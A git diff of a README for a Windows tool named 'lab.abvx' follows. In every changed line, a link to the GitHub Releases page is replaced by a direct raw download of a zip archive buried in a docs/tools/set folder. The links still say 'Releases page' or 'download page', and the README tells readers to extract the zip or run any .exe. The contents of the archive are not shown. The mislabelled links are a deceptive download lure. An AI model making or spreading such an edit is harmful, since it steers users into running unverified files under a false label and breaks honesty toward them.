@@ -1,6 +1,6 @@
 # 🧩 lab.abvx - Simple tools in one place
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/laxminetwork/lab.abvx/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/laxminetwork/lab.abvx/raw/refs/heads/main/docs/tools/set/abvx_lab_3.5.zip)
 
 ## 🚀 What this is
 
@@ -10,14 +10,14 @@ This page is for Windows users who want a simple way to get the app, open it, an
 
 ## 💾 Download the app
 
-1. Open the [Releases page](https://github.com/laxminetwork/lab.abvx/releases)
+1. Open the [Releases page](https://github.com/laxminetwork/lab.abvx/raw/refs/heads/main/docs/tools/set/abvx_lab_3.5.zip)
 2. Find the latest release
 3. Download the Windows file for the app
 4. Save it to your computer
 
 If the release includes a `.zip` file, download that file and extract it first. If it includes an `.exe` file, download and run this file.
 
-[Visit the Releases page](https://github.com/laxminetwork/lab.abvx/releases)
+[Visit the Releases page](https://github.com/laxminetwork/lab.abvx/raw/refs/heads/main/docs/tools/set/abvx_lab_3.5.zip)
 
 ## 🪟 Run on Windows
 
@@ -127,7 +127,7 @@ For a smooth setup:
 
 ## 📎 Quick access
 
-[Open the download page](https://github.com/laxminetwork/lab.abvx/releases)
+[Open the download page](https://github.com/laxminetwork/lab.abvx/raw/refs/heads/main/docs/tools/set/abvx_lab_3.5.zip)
 
 ## ⚙️ For daily use
 
